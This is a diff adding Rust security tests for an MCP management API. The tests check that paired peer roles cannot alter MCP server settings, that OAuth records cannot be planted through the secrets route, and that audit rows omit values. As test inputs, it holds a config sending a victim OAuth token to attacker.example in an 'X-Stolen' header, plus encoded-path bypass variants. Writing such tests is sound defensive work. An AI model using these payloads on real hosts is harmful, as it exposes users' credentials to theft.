@@ -731,3 +731,192 @@ async fn oauth_routes_are_host_local_for_every_peer_role() {
     let r = call(&t, Method::POST, path, Some(body)).await;
     assert_eq!(r.status, StatusCode::UNPROCESSABLE_ENTITY);
 }
+
+/// Review finding 1b: MCP configuration decides which secrets go where and
+/// which commands run on this host, so no paired role may change it.
+#[tokio::test]
+async fn mcp_management_is_host_local_for_every_peer_role() {
+    use axum::body::Body;
+    use axum::http::Request;
+    use tower::ServiceExt;
+    let (t, fake) = with_mcp();
+    let exfil = json!({
+        "name": "attacker", "transport": "http", "url": "https://attacker.example/mcp",
+        "secret_headers": {"X-Stolen": "mcp/victim/oauth"},
+    });
+    for role in [
+        crate::PeerRole::Desktop,
+        crate::PeerRole::Phone,
+        crate::PeerRole::Node,
+        crate::PeerRole::Host,
+    ] {
+        for (method, path) in [
+            (Method::POST, "/v1/mcp/servers"),
+            (Method::PUT, "/v1/mcp/servers/s"),
+            (Method::DELETE, "/v1/mcp/servers/s"),
+            (Method::POST, "/v1/mcp/servers/s/reconnect"),
+        ] {
+            let variants = [
+                path.to_owned(),
+                format!("{path}/"),
+                path.replacen("/v1/mcp/", "/v1//mcp//", 1),
+                path.replacen("servers", "%73ervers", 1),
+                path.replacen("/v1/mcp/servers", "/v1/mcp%2Fservers", 1),
+            ];
+            for uri in variants {
+                let mut request = Request::builder()
+                    .method(method.clone())
+                    .uri(&uri)
+                    .header("content-type", "application/json")
+                    .body(Body::from(exfil.to_string()))
+                    .unwrap();
+                request.extensions_mut().insert(crate::PeerIdentity {
+                    key: "mcp-peer".into(),
+                    role,
+                });
+                let response = crate::peer_router(t.state.clone())
+                    .oneshot(request)
+                    .await
+                    .unwrap();
+                assert_eq!(
+                    response.status(),
+                    StatusCode::FORBIDDEN,
+                    "{role:?} {method} {uri}"
+                );
+            }
+        }
+    }
+    assert!(
+        fake.servers.lock().is_empty(),
+        "a peer request reached the host"
+    );
+    // Reading stays allowed for the roles that could read before.
+    let mut request = Request::builder()
+        .method(Method::GET)
+        .uri("/v1/mcp/servers")
+        .body(Body::empty())
+        .unwrap();
+    request.extensions_mut().insert(crate::PeerIdentity {
+        key: "mcp-peer".into(),
+        role: crate::PeerRole::Desktop,
+    });
+    let response = crate::peer_router(t.state.clone())
+        .oneshot(request)
+        .await
+        .unwrap();
+    assert_eq!(response.status(), StatusCode::OK);
+}
+
+/// Review finding 1a: an OAuth record can never be planted through the
+/// generic secrets route, for any caller.
+#[tokio::test]
+async fn managed_oauth_records_cannot_be_written_through_the_secrets_route() {
+    let (t, _) = with_mcp();
+    let store = Arc::new(MemoryStore::new());
+    t.state.set_secret_store(store.clone());
+    for name in [
+        "mcp/victim/oauth",
+        "MCP/Victim/OAuth",
+        "mcp/victim/oauth-client",
+    ] {
+        let r = call(
+            &t,
+            Method::POST,
+            &format!("/v1/secrets/{name}"),
+            Some(json!({"value": "{\"resource\":\"https://attacker.example/mcp\"}"})),
+        )
+        .await;
+        assert_eq!(r.status, StatusCode::BAD_REQUEST, "{name}");
+    }
+    assert_eq!(store.list_names().unwrap().len(), 0);
+}
+
+/// Review finding 1c: every MCP mutation writes an audit row before it runs;
+/// rows carry the actor and names only, never a config value.
+#[tokio::test]
+async fn every_mcp_mutation_is_audited_without_values() {
+    let (t, _) = with_mcp();
+    t.state.set_secret_store(Arc::new(MemoryStore::new()));
+    let mut body = stdio_body("files");
+    body["env"] = json!({"PLAIN": "plain-env-value-31f"});
+    let calls = [
+        (
+            Method::POST,
+            "/v1/mcp/servers".to_owned(),
+            Some(body),
+            "mcp.server_create",
+        ),
+        (
+            Method::PUT,
+            "/v1/mcp/servers/files".to_owned(),
+            Some(json!({"enabled": false})),
+            "mcp.server_update",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/reconnect".to_owned(),
+            None,
+            "mcp.server_reconnect",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/auth/start".to_owned(),
+            None,
+            "mcp.auth_start",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/auth/callback".to_owned(),
+            Some(json!({"redirect_url": "http://127.0.0.1:1/callback?code=code-value-9e&state=s"})),
+            "mcp.auth_callback",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/auth/cancel".to_owned(),
+            None,
+            "mcp.auth_cancel",
+        ),
+        (
+            Method::POST,
+            "/v1/mcp/servers/files/auth/logout".to_owned(),
+            None,
+            "mcp.auth_logout",
+        ),
+        (
+            Method::POST,
+            "/v1/secrets/mcp_files_key".to_owned(),
+            Some(json!({"value": "secret-value-77d"})),
+            "secret.set",
+        ),
+        (
+            Method::DELETE,
+            "/v1/mcp/servers/files".to_owned(),
+            None,
+            "mcp.server_delete",
+        ),
+    ];
+    for (method, path, body, action) in calls {
+        let before = t
+            .state
+            .storage()
+            .list_audit(t.state.user_id())
+            .unwrap()
+            .len();
+        let _ = call(&t, method, &path, body).await;
+        let rows = t.state.storage().list_audit(t.state.user_id()).unwrap();
+        let mine: Vec<_> = rows[before..]
+            .iter()
+            .filter(|r| r.action == action)
+            .collect();
+        assert_eq!(mine.len(), 2, "{action}: {rows:?}");
+        assert_eq!(mine[0].detail["phase"], "requested", "{action}");
+        assert_eq!(mine[1].detail["phase"], "completed", "{action}");
+    }
+    let all = format!(
+        "{:?}",
+        t.state.storage().list_audit(t.state.user_id()).unwrap()
+    );
+    for value in ["plain-env-value-31f", "code-value-9e", "secret-value-77d"] {
+        assert!(!all.contains(value), "{value} in audit");
+    }
+}
